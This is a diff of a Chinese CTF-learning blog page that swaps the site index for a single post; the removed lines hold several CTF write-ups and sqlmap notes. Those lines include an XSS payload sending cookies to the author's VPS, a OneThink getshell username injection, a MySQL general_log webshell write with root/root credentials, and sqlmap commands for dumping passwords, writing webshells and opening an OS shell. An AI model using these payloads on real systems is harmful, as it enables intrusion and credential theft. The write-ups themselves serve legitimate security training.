@@ -79,13 +79,17 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="bak6ry">
-<meta property="og:url" content="http://yoursite.com/index.html">
+<meta name="description" content="下面中实验室指的是网络安全实验室 题目全部来自bugku，南邮和网络安全实验室，题较基础，实验吧要复杂些， 文中所有知识点内容并不全，要学习原理及深入得自己去找资源学习，自学与搜集信息的能力是必不可少的 入门推荐书籍(必看):《白帽子讲web安全 》《代码审计:企业级web代码安全架构》 什么是CTF？CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctf入门总结">
+<meta property="og:url" content="http://yoursite.com/2018/08/31/ctf入门总结/index.html">
 <meta property="og:site_name" content="bak6ry">
+<meta property="og:description" content="下面中实验室指的是网络安全实验室 题目全部来自bugku，南邮和网络安全实验室，题较基础，实验吧要复杂些， 文中所有知识点内容并不全，要学习原理及深入得自己去找资源学习，自学与搜集信息的能力是必不可少的 入门推荐书籍(必看):《白帽子讲web安全 》《代码审计:企业级web代码安全架构》 什么是CTF？CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-08-31T07:53:55.854Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="bak6ry">
+<meta name="twitter:title" content="ctf入门总结">
+<meta name="twitter:description" content="下面中实验室指的是网络安全实验室 题目全部来自bugku，南邮和网络安全实验室，题较基础，实验吧要复杂些， 文中所有知识点内容并不全，要学习原理及深入得自己去找资源学习，自学与搜集信息的能力是必不可少的 入门推荐书籍(必看):《白帽子讲web安全 》《代码审计:企业级web代码安全架构》 什么是CTF？CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术">
 
 
 
@@ -115,7 +119,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/08/31/ctf入门总结/"/>
 
 
 
@@ -131,7 +135,7 @@
   </script>
 
 
-  <title>bak6ry</title>
+  <title>ctf入门总结 | bak6ry</title>
   
 
 
@@ -150,8 +154,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 	<a href="https://github.com/The7sins"  class="github-corner" aria-label="View source on Github"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
 
@@ -245,9 +248,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -277,9 +280,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/08/31/ctf入门总结/" itemprop="url">ctf入门总结</a></h1>
+          <h1 class="post-title" itemprop="name headline">ctf入门总结</h1>
         
 
         <div class="post-meta">
@@ -351,9 +352,7 @@
       
 
       
-        
-          
-            <p>下面中实验室指的是网络安全实验室</p>
+        <p>下面中实验室指的是网络安全实验室</p>
 <p>题目全部来自bugku，南邮和网络安全实验室，题较基础，实验吧要复杂些，</p>
 <p>文中所有知识点内容并不全，要学习<strong>原理</strong>及<strong>深入</strong>得自己去找资源学习，自学与搜集信息的能力是必不可少的</p>
 <p>入门推荐书籍(必看):《白帽子讲web安全 》《代码审计:企业级web代码安全架构》</p>
@@ -611,8 +610,6 @@
 </li>
 </ol>
 
-          
-        
       
     </div>
     
@@ -629,166 +626,28 @@
       
 
       
-
-      
-
       
       
-        <div class="post-eof"></div>
+
       
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/31/rwctf/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="bak6ry">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="bak6ry">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/08/31/rwctf/" itemprop="url">rwctf和南电新生平台一题</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
             
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-31T15:24:00+08:00">
-                2018-08-31
-              </time>
+              <a href="/2018/08/31/rwctf/" rel="next" title="rwctf和南电新生平台一题">
+                <i class="fa fa-chevron-left"></i> rwctf和南电新生平台一题
+              </a>
             
+          </div>
 
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
             
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/比赛/" itemprop="url" rel="index">
-                    <span itemprop="name">比赛</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+          </div>
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          
-            <p>#rwctf</p>
-<p>##签到题</p>
-<p>想了好久，结果发现只要尝试对这个网站进行常规的攻击，就会给flag，这个比赛果然果然比较接近实战</p>
-<p>##dot free<br>先测试了一下那个输入框里输入的地址会不会访问，发现不会，但是输入不同的值后端传回不同的内容，测试了一下感觉是个正则，因为正则用的比较多，我就想如果给正则传一个意外的值正则有可能会报错看看它后端到底是怎么写的,fuzz测试后发现post url=1会报错，报错页面中存在正则</p>
-<pre><code>e.data.iframe.value.indexOf(&apos;.&apos;) == -1
-e.data.iframe.value.indexOf(&quot;//&quot;) == -1
-e.data.iframe.value.indexOf(&quot;。&quot;) == -1
-typeof(e.data.iframe != &apos;object&apos;)
-</code></pre><p>ip中不能有. 和//于是十进制构造ip绕过，/\绕过\</p>
-<p>然后是JSON.parse说明要传入一个json_encode<br>于是构造Payload<br><code>http://13.57.104.34/?{&quot;iframe&quot;:{&quot;value&quot;:&quot;\\\\vps的ip:4444&quot;}}</code><br>调用vps的js获取cookie,在vps的xss平台中拿到flag。</p>
-<p>##西电新出的一道代码审计题，没有wp，感觉题还不错，就写一下</p>
-<p><a href="http://13.57.246.101/moe/index.php" target="_blank" rel="noopener">http://13.57.246.101/moe/index.php</a></p>
-<p>第一步正则很好绕，第二部json_decode做了我两个多小时，结果最后总算弄出来了，最后发现这个题的关键是要猜secret的数据是如何构造的，感觉还不错，分享一下，猜测可能是数字和字母的组合，类似6asdwe这种形式，6asdwe==6E0，如果然后全是数字的话类似1.56161这种形式，也用1E0这种方式去绕，如果它全是字母就要这么绕，awsdad==6E-99999999,所以就这样猜测它secret是怎么组合的，利用==号弱类型，比较的时候的类型转换，6e0是6，6a和数字==比较时会只看第一个数字，后面的字母会被抹去，然后6就和6相等了，6e-999999那个是利用超过最大精度处理时会舍去，像0.000000000001就等于0了，0和字母==比较，字母会转换为0,然后就相等了</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -798,934 +657,11 @@ typeof(e.data.iframe != &apos;object&apos;)
   </article>
 
 
-    
-      
 
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/23/巅峰极客/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="bak6ry">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="bak6ry">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/07/23/巅峰极客/" itemprop="url">巅峰极客2018第一场部分wp</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-23T10:49:00+08:00">
-                2018-07-23
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/比赛/" itemprop="url" rel="index">
-                    <span itemprop="name">比赛</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>#web：</p>
-<p>拿到题目先百度一下，于是找到onethink的一个漏洞。</p>
-<p>WooYun-2016-185742</p>
-<p>就是注册个账号为：</p>
-<p>%250a%24a%3d%24_GET%5ba%5d%3b%2f%2f%250aecho+%60%24a%60%3b%2f%2f</p>
-<p>就可以getshell， 但因为账号长度有限制。所以分别两个来注册</p>
-<p> 账号一的用户名：%0a$a=$_GET[a];//</p>
-<p> 账号二的用户名：%0aecho <code>$a</code>;//</p>
-<p> 注意要用burp来改包，不然会失败。之后依次登入，也要用burp来改包登入。在那之后然后访问生成的缓存文件</p>
-<p>本题的关键是通过源码<a href="http://www.zip泄露在本地浮现的时候找到生成的缓存文件名" target="_blank" rel="noopener">www.zip泄露在本地浮现的时候找到生成的缓存文件名</a></p>
-<p>例如 /Runtime/Temp/onethink_2bb202459c30a1628513f40ab22fa01a.php</p>
-<p>find / -name flag*<br>查找下flag位置 cat就行了</p>
-<p>/Runtime/Temp/onethink_2bb202459c30a1628513f40ab22fa01a.php?a=cat  /temp/flag</p>
-<p>#杂项</p>
-<p>lsb隐写，三个通道分离出来，Ook，brainfcuk解密就行了</p>
-
-          
-        
+    <div class="post-spread">
       
     </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
   </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/23/sctf2018/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="bak6ry">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="bak6ry">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/07/23/sctf2018/" itemprop="url">sctf2018部分wp</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-23T09:49:00+08:00">
-                2018-07-23
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/比赛/" itemprop="url" rel="index">
-                    <span itemprop="name">比赛</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>神奇的Modbus<br>发现是pcapng后缀的，用wireshark打开，过滤modbus，追钟tcp流得到flag.<br>推荐去学下wireshark数据包分析，教程太多了适合自己的才是最好的，我就不分享链接了。</p>
-<p>神秘的交易<br> <img src="/ctf/1.png" alt=""><br><img src="/ctf/2.png" alt=""></p>
-<p>学习链接：<a href="https://bbs.pediy.com/thread-151259.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-151259.htm</a></p>
-<p>因为题目告知是一张4442的接触式卡，所以对应发送的命令格式为 一个字节指令类型 一个字节地址 一个字节数据</p>
-<p>物体会依次发送该数据包到卡片，其中s1 s2 s3拼在一起就是那三个字节的口令了！</p>
-<ol>
-<li>.找数据s1 在中间标线处找到0x33<br>的二进制：11001100（注意数完一个字节）</li>
-</ol>
-<p>(数完八个)</p>
-<ol start="2">
-<li>找 中的0x01依次向右数的第二个字节为0x01的二进制(每个字节是八位，所有数八个)接下来的一个字节就是s1了，注意！！！！数据从低位到高位的顺序发送，所以读完8个过后要倒一下，</li>
-<li>二进制转16进制（题目要求的）</li>
-<li>同理可以找到s2和s3. s1,s2,s3拼接起来为加密密钥。</li>
-</ol>
-<p>肥宅快乐题<br>我很喜欢这个题，拿道题的第一反应就是玩，真的是肥宅快乐题。我很快乐，但我不胖。拿到题看到Flash游戏，通关后，注意与NPC的对话哦;)我是真想去通关，正好做题做的好累，但是发现通关一个游戏更累就放弃了，或许这就是我做这个题的动力吧。于是想到下载个flash的反编译软件： 然后打开文件 ，游戏里所有对话一定写在这某个地方，发现动作里有源代码，搜索游戏中开场的对话，发现每句前面有t0,t1,t2来标识。马上想到可以通过搜索t0找到所有段对话的开始，然后，去最后的几个的t0那里应该就是游戏结束的地方了，果不其然，<br>：找到了flag，base64解密后获得。这里说个ctf心得吧，我这个题本来可以前三个做出来的，结果上了个厕所，在厕所里玩了会手机，就变成第8个了，所以，做题要专注。。。。。。</p>
-<p>侧信道初探<br>学习链接：<a href="https://g2ex.github.io/2016/05/31/Power-Analysis-Attacks-on-Smart-Card/" target="_blank" rel="noopener">https://g2ex.github.io/2016/05/31/Power-Analysis-Attacks-on-Smart-Card/</a></p>
-<p>简单的能量分析攻击（SPA）真的很简单， 密钥位为 0 时运算的功耗和密钥位为 1 时运算的功耗存在差异，通过这样的差异分析出密钥位的值，按照一定规律组合得到完整的密钥<br>以 为分界线分，可以分成10份，然后按照波长也就是宽度。宽的能量消耗大也就对应1，窄的对应0，最后数出来是得flag，之前一直弄不对，最后发现SCTF大写就对了，真的是这里卡太久了，签到题上面都是小写，哎经验不足，丢失大量时间，以后吸取教训。<br>easiest web - phpmyadmin<br>学习链接： <a href="http://www.kernelpicnic.net/2016/03/06/BKPCTF-Suffolk-Downs-Bug-Bounty-Write-Up.html" target="_blank" rel="noopener">http://www.kernelpicnic.net/2016/03/06/BKPCTF-Suffolk-Downs-Bug-Bounty-Write-Up.html</a></p>
-<p>Web服务器现在关了，进不去了，所以就没法附图了，不好意思，不过学习链接的题和这个很像，wp也很详细。推荐去看一波。<br>root/root 弱口令进phpmyAdmin<br>收集下信息，翻看下数据库表，没啥发现<br>尝试写shell，随便猜个路径 /var/www/html<br>失败，提示开启了安全模式<br>尝试利用mysql日志文件写shell<br>show variables like “%general_log”;– 查看变量，发现general_log_file值为c:\phpStudy\mysql\xxx<br>看到phpstudy，猜测网站根目录为phpstudy/www目录</p>
-<p>set global general_log=”ON”;– 开启mysql日志<br>set global general_log_file=”c:/phpstudy/www/shell.php”;– 设置日志保存路径<br>select “&lt;?php @$_GET<a href="$_POST[&#39;c&#39;]">‘f’</a>;?&gt;”;– 写shell<br>菜刀连接，flag在c盘下</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/11/mysql操作手册/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="bak6ry">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="bak6ry">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/04/11/mysql操作手册/" itemprop="url">sqlmap</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-11T23:43:10+08:00">
-                2018-04-11
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>获取数据库基本信息</p>
-<p>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1&quot;" target="_blank" rel="noopener">http://www.vuln.cn/post.php?id=1&quot;</a>  –dbms mysql –level 3 –dbs</p>
-<p>查询有哪些数据库</p>
-<p>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1&quot;" target="_blank" rel="noopener">http://www.vuln.cn/post.php?id=1&quot;</a>  –dbms mysql –level 3 -D test –tables</p>
-<p>查询test数据库中有哪些表</p>
-<p>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1&quot;" target="_blank" rel="noopener">http://www.vuln.cn/post.php?id=1&quot;</a>  –dbms mysql –level 3 -D test -T admin –columns</p>
-<p>查询test数据库中admin表有哪些字段</p>
-<p>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1&quot;" target="_blank" rel="noopener">http://www.vuln.cn/post.php?id=1&quot;</a>  –dbms mysql –level 3 -D test -T admin -C “username,password” –dump</p>
-<p>dump出字段username与password中的数据</p>
-<p>其他命令参考下面<br>从数据库中搜索字段</p>
-<p>sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password<br>在dedecms数据库中搜索字段admin或者passwor<br>读取与写入文件</p>
-<p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p>
-<p>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）<br>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）<br>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</p>
-<p>#示例：<br>sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”</p>
-<p>使用shell命令：</p>
-<p>sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell<br>接下来指定网站可写目录：<br>“E:\php\htdocs\dvwa”</p>
-<p>#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）<br>sqlmap详细命令：</p>
-<pre><code>--is-dba 当前用户权限（是否为root权限）
---dbs 所有数据库
---current-db 网站当前数据库
---users 所有数据库用户
---current-user 当前数据库用户
---random-agent 构造随机user-agent
---passwords 数据库密码
---proxy http://local:8080 --threads 10 (可以自定义线程加速) 代理
---time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
-</code></pre>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/11/python/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="bak6ry">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="bak6ry">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/04/11/python/" itemprop="url">python学习</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-11T23:43:10+08:00">
-                2018-04-11
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>python</p>
-<ul>
-<li>Python 中的标识符是区分大小写的。</li>
-<li>Python 可以同一行显示多条语句，方法是用分号 ; 分开</li>
-<li>在.py文件的第一行加上一个特殊的注释#!/usr/bin/env python3然后通过￥ chmod a+x hello.py命令给hello.py以执行权限<h1 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h1></li>
-<li><blockquote>
-<blockquote>
-<blockquote>
-<p>print(‘hello,world’)</p>
-</blockquote>
-</blockquote>
-</blockquote>
-</li>
-<li>，用逗号“,”隔开，就可以连成一串输出：会依次打印每个字符串，遇到逗号“,”会输出一个空格，</li>
-<li>input()，可以让用户输入字符串</li>
-<li>例子：name = input(‘please enter your name: ‘)<br>print(‘hello,’, name)</li>
-<li>print(‘1024<em>768=’,1024</em>768)<br>#python基础：<blockquote>
-<p>##数据类型和变量##</p>
-</blockquote>
-</li>
-<li>如果字符串内部既包含’又包含”怎么办？可以用转义字符\来标识<ul>
-<li>print(‘\\t\‘)</li>
-<li>\       \</li>
-<li>print(r’\\t\‘)用r’’表示’’内部的字符串默认不转义</li>
-<li>\\t\</li>
-</ul>
-</li>
-<li>在输入多行内容时，提示符由&gt;&gt;&gt;变为…，提示你可以接着上一行输入，注意…是提示符</li>
-<li>多行字符串’’’…’’’还可以在前面加上r使用</li>
-<li>可以把任意数据类型赋值给变量，同一个变量可以反复赋值，而且可以是不同类型的变量</li>
-<li>//，称为地板除，两个整数的除法仍然是整数</li>
-<li>/除法计算结果是浮点数，即使是两个整数恰好整除，结果也是浮点数</li>
-<li>全部大写的变量名表示常量只是一个习惯上的用法<blockquote>
-<p>##字符串和编码##</p>
-</blockquote>
-</li>
-<li>ASCII编码是1个字节，而Unicode编码通常是2个字节</li>
-<li>如果统一成Unicode编码，乱码问题从此消失了。但是，如果你写的文本基本上全部是英文的话，用Unicode编码比ASCII编码需要多一倍的存储空间，在存储和传输上就十分不划算。</li>
-<li>ASCII编码的A用Unicode编码，只需要在前面补0就可以</li>
-<li>UTF-8编码把一个Unicode字符根据不同的数字大小编码成1-6个字节，常用的英文字母被编码成1个字节，汉字通常是3个字节，只有很生僻的字符才会被编码成4-6个字</li>
-<li>内存中，统一使用Unicode编码，当需要保存到硬盘或者需要传输的时候，就转换为UTF-8编码</li>
-<li>ord()函数获取字符的整数表示，chr()函数把编码转换为对应的字符</li>
-<li>bytes类型的数据用带b前缀的单引号或双引号表示</li>
-<li>如果bytes中只有一小部分无效的字节，可以传入errors=’ignore’忽略错误的字节：</li>
-<li>符串里面的%是一个普通字符怎么办？这个时候就需要转义，用%%来表示一个%</li>
-<li>例子：print(‘%2d-%02d’ % (3, 1))<br>print(‘%.2f’ % 3.1415926)</li>
-<li>这是因为括号()既可以表示tuple，又可以表示数学公式中的小括号，这就产生了歧义，因此，Python规定，这种情况下，按小括号进行计算，计算结果自然是1。所以，只有1个元素的tuple定义时必须加一个逗号,，来消除歧义：</li>
-<li>list和tuple是Python内置的有序集合，一个可变，一个不可变。根据需要来选择使用它们。，</li>
-<li>元组使用小括号，列表使用方括号，元组创建很简单，只需要在括号中添加元素，并使用逗号隔开即可</li>
-<li>字典的每个键值 key=&gt;value 对用冒号 : 分割，每个键值对之间用逗号 , 分割，整个字典包括在花括号 {} 中 ,格式如下所示<blockquote>
-<p>##循环判断##<br>*if &lt;条件判断1&gt;:</p>
-</blockquote>
-</li>
-</ul>
-<blockquote>
-<ul>
-<li>elif &lt;条件判断2&gt;:</li>
-</ul>
-</blockquote>
-<blockquote>
-<ul>
-<li>elif &lt;条件判断3&gt;:</li>
-</ul>
-</blockquote>
-<blockquote>
-<ul>
-<li>else:</li>
-<li>input()返回的数据类型是str，str不能直接和整数比较，必须先把str转换成整数。Python提供了int()函数来完成这件事情</li>
-<li>for x in …循环就是把每个元素代入变量x，然后执行缩进块的语句</li>
-<li>range(5)生成的序列是从0开始小于5的整数：</li>
-<li>例如 list(range(5))</li>
-<li>[0, 1, 2, 3, 4]<br>##函数##</li>
-<li>定义一个什么事也不做的空函数，可以用pass语句</li>
-<li>数据类型检查可以用内置函数isinstance()实现</li>
-<li>Python的函数返回多值其实就是返回一个tuple</li>
-<li>必选参数在前，默认参数在后，否则Python的解释器会报错<br>*</li>
-</ul>
-</blockquote>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/11/sql注入语句/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="bak6ry">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="bak6ry">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/04/11/sql注入语句/" itemprop="url">SQL注入</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-11T23:43:10+08:00">
-                2018-04-11
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
